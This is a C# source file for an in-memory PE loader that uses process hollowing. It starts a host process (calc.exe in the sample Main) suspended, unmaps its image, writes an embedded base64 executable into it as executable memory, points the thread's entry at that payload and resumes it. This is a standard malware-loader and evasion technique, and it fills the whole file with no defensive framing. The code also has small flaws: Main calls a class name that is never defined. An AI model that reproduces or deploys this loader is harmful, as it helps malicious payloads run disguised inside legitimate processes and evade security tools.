using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace ByteArrayExec
{
    public static unsafe class ByteArrayExec
    {
        /*
         * Runs BYTEARRAY from memory
         *
         * bytearray - the actuall bytearray
         * hprocess - full path of the host process to run the buffer in
         */
        public static bool Run(byte[] bytearray, string hprocess)
        {
            var IMAGE_SECTION_HEADER = new byte[0x28];	// Section Header entry Size: 0x28 bytes 
            var IMAGE_NT_HEADERS = new byte[0xf8];	// The size of the NT header (including File header and Optional header) comes to around 248 (0xF8) bytes
            var IMAGE_DOS_HEADER = new byte[0x40];	// The size of DOS header is 64 bytes. The DOS header ends at 64 bytes (3C + 4 = 0x40 bytes)
            var PROCESS_INFO = new int[0x4];		// Suspended
            var CONTEXT = new byte[0x2cc];		// 0x2CC bytes

            byte* proc_img_sec_hea;
            fixed (byte* p = &IMAGE_SECTION_HEADER[0])
                proc_img_sec_hea = p;

            byte* proc_img_nt_hea;
            fixed (byte* p = &IMAGE_NT_HEADERS[0])
                proc_img_nt_hea = p;

            byte* proc_img_dos_hea;
            fixed (byte* p = &IMAGE_DOS_HEADER[0])
                proc_img_dos_hea = p;

            byte* cnt;
            fixed (byte* p = &CONTEXT[0])
                cnt = p;

            *(uint*)(cnt + 0x0) = CONTEXT_FULL;								// Set CONTEXT flags

            Buffer.BlockCopy(bytearray, 0, IMAGE_DOS_HEADER, 0, IMAGE_DOS_HEADER.Length);		// Get the DOS header of the BYTEARRAY/EXE.

            if (*(ushort*)(proc_img_dos_hea + 0x0) != IMAGE_DOS_SIGNATURE)				// 0x0 e_magic - is MZ header ok?
                return false;

            var e_lfanew = *(int*)(proc_img_dos_hea + 0x3c);

            Buffer.BlockCopy(bytearray, e_lfanew, IMAGE_NT_HEADERS, 0, IMAGE_NT_HEADERS.Length);	// Get the NT header of the BYTEARRAY/EXE.

            if (*(uint*)(proc_img_nt_hea + 0x0 /* Signature */) != IMAGE_NT_SIGNATURE)			// 0x0 signature - is PE00 header ok?
                return false;

            if (!CreateProcess(null, hprocess, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, new byte[0x44], PROCESS_INFO))
                return false;

            var ImageBase = new IntPtr(*(int*)(proc_img_nt_hea + 0x34));
            NtUnmapViewOfSection((IntPtr)PROCESS_INFO[0], ImageBase);					// PROCESS_INFO[0] - pi.hProcess
            if (VirtualAllocEx((IntPtr)PROCESS_INFO[0], ImageBase, *(uint*)(proc_img_nt_hea + 0x50 /* SizeOfImage */), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) == IntPtr.Zero)
                Run(bytearray, hprocess); 							// Memory allocation failed - try again and check if your system is running out of memory first

            fixed (byte* p = &bytearray[0])
                NtWriteVirtualMemory((IntPtr)PROCESS_INFO[0], ImageBase, (IntPtr)p, *(uint*)(proc_img_nt_hea + 84), IntPtr.Zero);		// 84 = SizeOfHeaders

            for (ushort i = 0; i < *(ushort*)(proc_img_nt_hea + 0x6); i++)				// 0x6 - NumberOfSections
            {
                Buffer.BlockCopy(bytearray, e_lfanew + IMAGE_NT_HEADERS.Length + (IMAGE_SECTION_HEADER.Length * i), IMAGE_SECTION_HEADER, 0, IMAGE_SECTION_HEADER.Length);
                fixed (byte* p = &bytearray[*(uint*)(proc_img_sec_hea + 0x14)])	// 0x14 - PointerToRawData	
                    NtWriteVirtualMemory((IntPtr)PROCESS_INFO[0], (IntPtr)((int)ImageBase + *(uint*)(proc_img_sec_hea + 0xc)), (IntPtr)p, *(uint*)(proc_img_sec_hea + 0x10), IntPtr.Zero);	// 0xc - VirtualAddress  /  0x10 - SizeOfRawData
            }

            NtGetContextThread((IntPtr)PROCESS_INFO[1], (IntPtr)cnt);
            NtWriteVirtualMemory((IntPtr)PROCESS_INFO[0], (IntPtr)(*(uint*)(cnt + 0xAC)), ImageBase, 0x4, IntPtr.Zero);		// 0xAC - ecx
            *(uint*)(cnt + 0xB0) = (uint)ImageBase + *(uint*)(proc_img_nt_hea + 0x28);						// 0xB0 - eax   /   0x28 - AddressOfEntryPoint
            NtSetContextThread((IntPtr)PROCESS_INFO[1], (IntPtr)cnt);								// PROCESS_INFO[1] - pi.hThread 
            NtResumeThread((IntPtr)PROCESS_INFO[1], IntPtr.Zero);

            return true;
        }

        #region WinNT Definitions

        private const uint CONTEXT_FULL = 0x10007;
        private const int CREATE_SUSPENDED = 0x4;
        private const int MEM_COMMIT = 0x1000;
        private const int MEM_RESERVE = 0x2000;
        private const int PAGE_EXECUTE_READWRITE = 0x40;
        private const ushort IMAGE_DOS_SIGNATURE = 0x5A4D; // MZ
        private const uint IMAGE_NT_SIGNATURE = 0x00004550; // PE00

        #region WinAPI
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, byte[] lpStartupInfo, int[] lpProcessInfo);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtWriteVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, IntPtr lpNumberOfBytesWritten);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtGetContextThread(IntPtr hThread, IntPtr lpContext);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetContextThread(IntPtr hThread, IntPtr lpContext);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtResumeThread(IntPtr hThread, IntPtr SuspendCount);
        #endregion

        #endregion
    }

    class Program
    {
        public static readonly string _exeFile = "base64 encoded byte array";

        static void Main(string[] args)
        {
            byte[] backToBytes = Convert.FromBase64String(_exeFile);
            CMemoryExecute.Run(backToBytes, @"C:\Windows\system32\calc.exe");
        }
    }
}

